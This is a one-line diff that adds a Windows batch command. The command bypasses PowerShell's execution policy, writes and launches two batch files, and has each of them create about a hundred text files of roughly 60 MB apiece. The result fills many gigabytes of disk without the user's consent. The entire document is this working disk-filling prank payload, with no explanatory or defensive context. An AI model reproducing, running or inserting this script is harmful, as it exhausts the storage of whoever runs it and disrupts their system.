@@ -1,0 +1,1 @@
+@powershell -NoProfile -ExecutionPolicy bypass -Command for ($i = 0; $i -le 1; $i++) { new-item txt${i}.bat; Set-Content txt${i}.bat 'powershell -NoProfile -ExecutionPolicy bypass -Command for ($j = 0; $j -le 100; $j++) { new-item %%0${j}.txt; Set-Content %%0${j}.txt (''HEHEHE'' * 10000000)}'; Start-Process -FilePath txt${i}.bat }
